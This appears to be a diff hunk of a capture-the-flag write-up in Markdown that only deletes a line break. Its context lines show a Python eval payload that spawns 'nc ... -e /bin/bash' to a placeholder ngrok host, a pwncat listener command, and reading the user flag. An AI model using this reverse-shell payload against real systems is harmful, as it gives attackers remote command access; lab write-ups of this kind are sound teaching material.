@@ -88,7 +88,6 @@ eval('__import__("subprocess").getoutput("nc <NGROK_IP> <NGROK_PORT> -e /bin/bas
 ```
 ![Reverse Shell](pics/rev_shell.png)
 And voila! We have a shell. Even if the shell gets closed for some reason (internet drops, we press `Ctl-C` by accident, etc.), the only thing we need to do is to open a new listener (`pwncat -l 0.0.0.0 4444`), and we will get connected.
-<br />
 The only thing left is to get the user flag.
 ```
 cat /home/intern/user.txt
